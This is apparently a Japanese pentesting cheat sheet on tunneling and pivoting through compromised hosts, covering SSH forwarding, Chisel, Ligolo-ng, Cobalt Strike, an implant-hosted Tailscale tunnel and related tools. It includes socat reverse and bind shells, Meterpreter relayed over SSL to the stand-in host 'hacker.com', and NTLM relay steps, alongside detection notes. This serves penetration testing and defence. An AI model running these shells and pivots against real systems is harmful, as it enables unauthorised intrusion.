# トンネリングとポートフォワーディング

{{#include ../banners/hacktricks-training.md}}

## Nmapのヒント

> [!WARNING]
> NmapのproxyサポートはTCP接続に限られ、ping、ポートスキャン、OS検出スキャンには影響しません。scannerがSOCKS proxyの背後にある場合は、**host discoveryを無効化**（`-Pn`）し、**TCP connect scan**（`-sT`）を使用してください。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最後のコマンドでは、Evil-WinRMの`-u`オプションと`-i`オプションでアカウントとWinRMホストを指定します。WinRMのデフォルトポートは5985です。<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSHは、暗号化されたチャネルを介してX11接続、任意のTCPポート、Unixドメインソケットを転送できます。<sup>[[6]](#references)</sup>

SSHのグラフィカル接続（X）

`-Y`は信頼されたX11転送を有効にし、`-C`は転送データの圧縮を要求します。<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Server で新しい Port を開く --> Other port

リモート（`-R`）forwarding は SSH サーバー側で待ち受け、ローカル側に接続します。明示的な bind address によって、そのリスナーに接続できるインターフェースが決まります。<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

ローカルポート --> 侵害されたホスト (SSH) --> Third_box:Port

ローカル (`-L`) フォワーディングはクライアント上で待ち受け、SSH サーバー側から宛先に接続します。<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

ローカルポート --> 侵害されたホスト (SSH) --> 任意の接続先

Dynamic (`-D`) forwarding は、接続がリモート側から開かれるローカル SOCKS4/SOCKS5 リスナーを作成します。<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump によるマルチホップ

`-J`/`ProxyJump` は、カンマ区切りで指定した1つ以上のジャンプホストを経由してターゲットに接続します。転送オプションは引き続き最終 SSH 接続に適用されるため、以下の SOCKS リスナーは最初の bastion ではなく、`internal-target` から接続先にアクセスします。これにより、ジャンプホストにログインして、そこで2つ目の SSH クライアントを起動する必要がありません。<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

ジャンプマシン固有のオプションは `~/.ssh/config` に記述する必要があります。宛先向けにコマンドラインで指定した設定は、中継ホストには自動的に適用されません。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

これは、内部ホストから DMZ を経由して自分のホストに reverse shell を接続する場合に役立ちます。

サーバーの `GatewayPorts` 設定は、remote forward が loopback の範囲外に bind できるかどうかを制御します。デフォルトは `no` です。<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

このrootベースの例では、両方のホストにトンネルデバイスを作成します。サーバーではtun forwardingを許可し、選択したアカウントがtunデバイスにアクセスできる必要があります。ここで`root`アカウントを使用する方法の1つは、`PermitRootLogin yes`を設定することです。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

サーバー側で転送を有効にする

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

クライアント側に新しいルートを設定する

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **セキュリティ – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6では、Terrapinによる初期トランスポート段階の完全性攻撃に対抗するため、strict-KEX拡張が追加されました。可能であれば両方のピアを更新し、古い実装については、転送されたチャネルがバージョンだけで保護されていると考えず、ベンダーのガイダンスに従ってください。<sup>[[8]](#references)</sup>

## SSHUTTLE

ホストを経由して、サブネット宛てのすべての通信を**ssh**で**トンネル**できます。\
たとえば、10.10.10.0/24宛てのすべての通信を転送します。

`sshuttle`はSSH経由の透過プロキシを提供し、以下に示すように、サブネットの選択とカスタムSSHコマンドに対応しています。<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

秘密鍵で接続する

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit の `portfwd` はローカルおよびリモートのポートフォワーディングをサポートします。一方、SOCKS proxy モジュールはセッションルートまたは `autoroute` と連携することを目的としており、ここでの例ではデフォルトでポート 1080 をリッスンします。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

ローカルポート --> 侵害されたホスト（アクティブセッション） --> Third_box:ポート

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

別の方法:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt StrikeのBeaconは、Beacon経由でSOCKS4a/SOCKS5接続を中継できます。`rportfwd`は侵害されたホスト上でバインドし、`rportfwd_local`はCobalt Strikeクライアントから接続先への接続を開始します。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon経由でトラフィックをルーティングするインターフェース上で、Team Serverのポートを開きます。<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> この場合、**ポートはTeam ServerではなくBeaconホスト上で開かれ**、トラフィックはTeam Serverに送られ、そこから指定されたhost:portに転送されます。<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

リバースフォワーディングのマニュアルには、次の動作が記載されています:<sup>[[14]](#references)</sup>

- Beacon のリバースポートフォワードは、**個々のマシン間でトラフィックを中継するためではなく、Team Server へのトンネルを作成するように設計されています**。
- トラフィックは、P2P リンクを含む Beacon の C2 トラフィック内で**トンネリングされます**。
- 高位ポートを使うと通常は特権ポートの制限を回避できますが、対象 OS のポリシーや既存のリスナーの影響は受けます。

### rPort2Port local

> [!WARNING]
> この場合、**ポートが開かれるのは Team Server ではなく Beacon ホストであり**、**トラフィックは Team Server ではなく Cobalt Strike クライアントに送信され**、そこから指定された host:port に送られます。<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - CDN-fronted インプロセス tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) は、TUN driver や service をインストールせずに、変更を加えた Tailscale overlay を Windows C2 implant 内で実行します。構成要素は、非同期 CGo `c-shared` `tailscaled` BOF-PE、ローカル API と通信する小型の C++ BOF-PE、そして非同期 `socksportfwd` TCP-to-SOCKS5 bridge の3つです。<sup>[[53]](#references)[[54]](#references)</sup>

### CDN互換の TS2021 と DERP

Tailscale は通常、Noiseベースの TS2021 control channel と DERP relay に独自の HTTP upgrades を使用します。BOFScale はその byte stream を維持しつつ、RFC 6455 WebSockets に載せて転送します。`Sec-WebSocket-Protocol: ts2021` または `derp` を使用することで、operator が管理する Headscale/DERP origin を、標準の WebSocket upgrades のみを受け付ける CDN の背後に配置できます。パッチ適用済み client は、HTTP `500` の後に TS2021 を WebSockets 経由で再試行し、HTTP `426` の後に DERP を再試行します。また、DERP WebSocket dialer が host proxy の設定に従うようにします。BOF は、失敗することが分かっている最初の試行をスキップするため、`TS_DEBUG_DERP_WS_CLIENT=1` を設定します。<sup>[[53]](#references)[[54]](#references)</sup>

CDN と origin proxy は、`/ts2021` と `/derp` の WebSocket upgrades を維持し、`/key` を通常の HTTP として転送し、relay session が無期限に開いたままになる可能性があるため、内部の read/write timeouts を無効にする必要があります。付属の Headscale configuration は `verify_clients` を有効にし、operator の埋め込み DERP map のみを公開します。また、Tailscale が運用する relay への fallback を防ぐため、`derp.urls` は空のままにします。<sup>[[53]](#references)[[54]](#references)</sup>

### インプロセス daemon と named-pipe control

上書きされない限り、BOF entry point は `tailscaled` を `-tun=userspace-networking`、`-state mem:`、`-no-logs-no-support` を指定して起動し、UUID 名の pipe を作成します。Go の stdout/stderr を OS pipe 経由で Beacon output API にリダイレクトするため、daemon と Go runtime 全体は常駐しますが、state と logs は Tailscale directory に書き込まれません。<sup>[[53]](#references)[[54]](#references)</sup>

軽量 client は、この pipe 上で Tailscale の HTTP/1.0 local API を再現します。daemon の `safesocket` layer が pipe client を impersonate するため、`SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` を指定して pipe を開き、`Tailscale-Cap: 125` を送信します。また、local API を `up`、`down`、`status`、route advertisement、shutdown の各操作にマッピングします。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> daemon に shutdown を要求した後、手動で map した Go BOF-PE を unload しないでください。runtime と garbage collector の goroutine が、loader によって unmap されたメモリから実行を続ける可能性があります。`tailscaled` は使い捨ての process で実行し、最終的な cleanup ではその process を terminate してください。<sup>[[54]](#references)</sup>

### userspace SOCKS5 経由で host 起点の traffic を bridge する

Inbound tailnet connections と advertised subnet routes は userspace network stack 内で機能しますが、侵害された host 上の通常の process には overlay への OS route がありません。そのため `socksportfwd` は victim 側の TCP port で listen し、daemon の `0.0.0.0:1080` listener と SOCKS5 `NO AUTH` をネゴシエートし、tailnet destination に対して `CONNECT` を発行して、双方向の traffic を非同期に relay します。target が MagicDNS name の場合は `ATYP_DOMAIN` を使うため、Windows resolver に名前を公開せずに `tailscaled` が名前を解決します。<sup>[[53]](#references)[[54]](#references)</sup>

以下に最小限の operator flow を示します。この CDN design を通過できないため、operator node と implant の両方でパッチ適用済みの binaries を使用する必要があります。<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

ローカルフォワードを使うと、見かけ上の認証リスナーとリレーツールを分離できます。マシンに侵害済みホストのバインドポートへ認証させ、その通信をtailnet経由で`ntlmrelayx`に転送し、さらにAD CS、LDAP、HTTP、SMBなどの互換性のあるターゲットへリレーします。脆弱性固有の各段階については、[WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie)と[ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)を参照してください。BOFScaleはトランスポートにすぎません。<sup>[[54]](#references)</sup>

### 検出

単一の弱い指標ではなく、複数の指標の組み合わせを探します。通常GoベースではないプロセスでのGoランタイム、緩いSDDL `D:(A;;GA;;;WD)`を持つUUIDパイプ、予期しない`0.0.0.0:1080` SOCKSリスナー、CDNアドレスへの長時間接続されたTLS WebSocketです。TLSインスペクションを行う場合、所有プロセスが許可された`tailscaled`サービスではないときに、`Sec-WebSocket-Protocol: derp`または`ts2021`を検知します。リポジトリの`bofscale.yar`ルールは、3つすべてのBOF-PEコンポーネントのメモリシグネチャを提供します。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

このプロジェクトには、`tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp`、`tunnel.php`などのWebトンネルエンドポイントが用意されています。ローカルプロキシを起動する前に、対応するエンドポイントを1つアップロードしてください。<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) の releases ページからダウンロードできます。\
Chisel は SSH で保護された接続を使用して HTTP 経由で TCP/UDP トラフィックを転送します。互換性のある client/server ビルドを使用し、選択した release のコマンド構文を確認してください。<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### ポートフォワーディング

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) は、WebSocket、HTTP/2、または WebTransport（QUIC 上の HTTP/3）経由で、static または dynamic forwards を転送します。現在のビルドは、TCP、UDP、Unix ソケット、stdio、SOCKS5、HTTP proxying、および Linux の transparent-proxy listener を、forward と reverse の両モードでサポートしています。<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

攻撃者側でサーバーを起動し、`-R` を指定してピボットから外向きに接続させます。この方向では SOCKS5 listener は **サーバー** 上に作成され、要求された接続は **クライアント/ピボット** のネットワークから発信されます。<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse Static Forwardは同じ方向を使用します。たとえば、次の設定では、pivotから到達できる`10.10.10.20:445`を、攻撃者側のloopback port `8445`で公開します。<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress とトランスポートの詳細

- client に `-p http://user:pass@proxy:8080` を追加すると、明示的な HTTP proxy を経由できます。`curl` などの client では `socks5h://127.0.0.1:1080` を使うか、アプリケーションで proxied DNS を有効にしてください。これにより、内部名はトンネルの先で解決され、ローカル resolver への leak を避けられます。<sup>[[52]](#references)</sup>
- `wss://` は TLS で保護された WebSocket を選択します。`https://` の client は HTTP/2 を選択しますが、reverse proxy/CDN による buffering や HTTP/1 への変換で双方向 stream が壊れることがよくあります。この mode をテストする場合は、wstunnel server を直接公開してください。<sup>[[52]](#references)</sup>
- `wts://` は QUIC 上の WebTransport を選択します。`--enable-webtransport`（または `wts://` の listen URL）を指定して server を起動し、listen port の UDP を許可してください。この mode は、TCP を転送する従来型の HTTP `CONNECT` proxy を通過できません。<sup>[[52]](#references)</sup>

> [!WARNING]
> upstream project は、組み込みの self-signed certificate をプライバシー保護として扱わないよう警告しています。有効な custom certificate と `--tls-verify-certificate`（または mTLS）を使い、リモートアクセスが意図されている場合を除いて proxy listener を loopback に限定し、機密性が重要な場合はすでに secure な protocol をトンネルしてください。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng のクイックスタートでは、proxy 上の TUN interface、agent の certificate fingerprint 検証、トンネル経由の network に対する route 設定について説明しています。<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### agent のバインドとリスニング

Ligolo-ng は、agent 上に listener を追加して proxy 側のアドレスに転送できます。また、予約済みの `240.0.0.0/4` の範囲をルーティングすることで、agent ローカルのサービスにアクセスできます。<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### エージェントのローカルポートへのアクセス

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivotは被害者側からリバーストンネルを開始し、攻撃者のループバックアドレス上にSOCKS4プロキシを公開します。READMEには、NTLMプロキシの認証情報やハッシュのオプションも記載されています。<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot through **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat は `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL`、`PROXY` などのアドレスタイプを組み合わせます。以下の例では、ドキュメントに記載されたこれらのエンドポイントを組み合わせています。<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### SOCKS経由のPort2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat経由のMeterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

socatで文書化されている`PROXY`アドレスタイプを使い、被害者のコンソールで最後の行の代わりに次の行を実行すると、**認証不要のプロキシ**を経由できます。<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat トンネル

**/bin/sh console**

Client と Server の両側で証明書を作成します。

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

ローカルのSSHポート（22）を攻撃者ホストの443ポートに接続する】【。

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

PlinkはPuTTYのコマンドライン接続ツールで、`ssh`と同様のSSH転送オプションを備えています。<sup>[[22]](#references)</sup>

SSHポートには大文字の`-P`を使用します。`-pw`は互換性のために残されていますが、プロセス一覧にパスワードが表示されます。可能であれば、鍵認証または`-pwfile`を使用してください。<sup>[[22]](#references)[[23]](#references)</sup>

このバイナリは被害者側で実行されるSSHクライアントなので、逆方向の接続用にSSHサービスとポートを開放します。以下では`-R`を使って、ローカルからアクセスできるポートを攻撃者のマシンに転送します。<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

永続的な `portproxy` ルールを作成または変更する場合は、ホストで必要な権限を持つコンテキストを使用してください。Microsoft は、以下で使用する `v4tov4` の追加、表示、削除の形式を公開しています。<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### スケジュールされたタスクを使った `portproxy` の展開

管理者の認証情報が利用できる場合、リモートの Task Scheduler 実行を使って、専用のリレーをアップロードせずにネイティブな転送ルールをインストールできます。たとえば、[Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) を使うと、pivot に TCP/443 で待ち受けさせ、接続を内部の SMB サービスに中継できます。<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

このルールは永続するため、`netsh interface portproxy show v4tov4` で列挙し、テスト後に明示的に削除してください。`portproxy` が提供するのは転送機能のみです。待ち受けポートを許可するには、ホストのファイアウォールも設定する必要があります。<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**システムへのRDPアクセスが必要です**。\
ダウンロード:

SocksOverRDPはRemote Desktop Dynamic Virtual Channelsを使用して、既存のRDPセッション経由でSOCKS5接続を転送します。クライアントプラグインは`127.0.0.1:1080`で待ち受け、サーバーコンポーネントはRDP接続先で動作します。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、WindowsのRemote Desktop Service機能に含まれる`Dynamic Virtual Channels`（`DVC`）を使用します。DVCは**RDP接続経由でパケットをトンネリング**する役割を担います。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

クライアントコンピューターで、次のように**`SocksOverRDP-Plugin.dll`**を読み込んでください:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

次に、**`mstsc.exe`** を使用して **victim** に **RDP** で**接続**できます。**SocksOverRDP plugin が有効になっている**という **prompt** が表示され、**127.0.0.1:1080** で **listen** するはずです。

**RDP** で**接続**し、`SocksOverRDP-Server.exe` バイナリを victim マシンにアップロードして実行します。

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

次に、攻撃者側のマシンでポート1080がリッスンしていることを確認します:

```
netstat -antb | findstr 1080
```

これで [**Proxifier**](https://www.proxifier.com/) を使い、そのポート経由でトラフィックをプロキシできます。<sup>[[26]](#references)</sup>

### RDP 仮想チャネルのハンティング

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) は、別の RDP 仮想チャネルトンネルです。デフォルトのチャネル名は `rdp2tcp` ですが、オペレーターは別の名前を選択できます。<sup>[[56]](#references)</sup> チャネルの作成と閉鎖は、イベント ID **132** および **148** として `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` に記録されます。`rdp2tcp` や、珍しいチャネル名またはランダムなチャネル名を探し、`XPSRD`、`cliprdr`、`Microsoft::Windows::RDS::DisplayControl` などの想定されるチャネルと比較します。<sup>[[58]](#references)</sup>

## Windows GUI アプリを Proxify する

[**Proxifier**](https://www.proxifier.com/) を使うと、Windows GUI アプリがプロキシ経由で通信するように設定できます。<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** で、SOCKS サーバーの IP アドレスとポートを追加します。\
**Profile -> Proxification Rules** で、プロキシ経由にするプログラム名と、プロキシ経由にする IP アドレスへの接続を追加します。Proxifier のルールでは、アプリケーション、宛先ホスト、ポートを条件にできます。<sup>[[27]](#references)</sup>

## NTLM プロキシ経由のトンネル

先述のツール **Rpivot** は、NTLM 認証を行うプロキシを経由して中継できます。**OpenVPN** も、auth ファイルと NTLMv2 メソッドを設定すれば、そのようなプロキシ経由でルーティングできます。これはプロキシの認証をバイパスするのではなく、プロキシを通過する手法です。<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlmは上流のNTLMプロキシに対して認証を行い、ローカルリスナーを公開し、ローカルのトンネルポートを宛先サービスにマッピングできます。クライアントはその後、このローカルポートを使用できます。<sup>[[29]](#references)</sup>\
たとえば、ポート443を転送します。

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

さて、たとえば被害者側で **SSH** サービスがポート 443 で待ち受けるように設定すると、攻撃者側のポート 2222 を通じて接続できます。<sup>[[29]](#references)</sup>\
攻撃者側がポート 2222 で待ち受ける間、localhost:443 に接続する **meterpreter** を使うこともできます。<sup>[[29]](#references)</sup>

## YARP

YARP（Yet Another Reverse Proxy）は、Microsoft の .NET リバースプロキシツールキットです。こちらから入手できます: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine は DNS クエリを通じて IPv4 トンネルを作成し、TUN インターフェースを使用します。ドキュメントに記載されているセットアップでは、両端でこれらのインターフェースを作成するために必要な権限が求められます。<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport は直接の TCP よりオーバーヘッドが大きく、通常は遅いため、このトンネル経由で圧縮 SSH 接続を作成できます:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

